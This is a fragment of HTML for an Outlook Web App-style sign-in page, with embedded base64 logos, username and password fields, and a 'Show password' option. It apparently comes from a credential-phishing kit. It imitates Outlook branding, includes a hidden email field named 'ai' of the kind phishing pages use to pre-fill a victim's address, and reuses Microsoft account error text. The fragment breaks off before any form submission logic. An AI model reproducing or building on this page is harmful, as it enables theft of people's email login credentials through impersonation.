                <img src="data:image/png;base64,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" class="owaLogo" aria-hidden="true" />
                <img src="data:image/png;base64,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" class="owaLogoSmall" aria-hidden="true" />
            </div>
        </div>
        <div class="logonContainer">
            <div id="lgnDiv" class="logonDiv">
                <div class="signInImageHeader" role="heading" aria-label="Outlook">
                    <img class="mouseHeader" src="data:image/png;base64,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" alt="Outlook" />
                </div>
                <div class="signInInputLabel" id="userNameLabel" aria-hidden="true">Domain\\user name:</div>
                <div>
                    <input type="email" id="email02" name="email02" class="signInInputText" role="textbox" required autocomplete="off" value="">
                </div>
                <div class="signInInputLabel" id="passwordLabel" aria-hidden="true">Password:</div>
                <div>
                    <input id="password" name="password" type="password" class="signInInputText" required>
                </div>
                <div><input hidden type="email" id="aiField" name="ai" class="signInInputText" role="textbox"></div>
                <div style="padding: 5px; color: red; font-size: 14px; display: none;" id="msg"></div>
                <span id="error" style="color: red; display: none;">That account doesn't exist. Enter a different account.</span>
                <div class="showPasswordCheck signInCheckBoxText">
                    <input type="checkbox" id="showPasswordCheck" class="chk" onclick="showPasswordClick()" />
                    <span>Show password</span>
                </div>
                <div class="signInEnter">
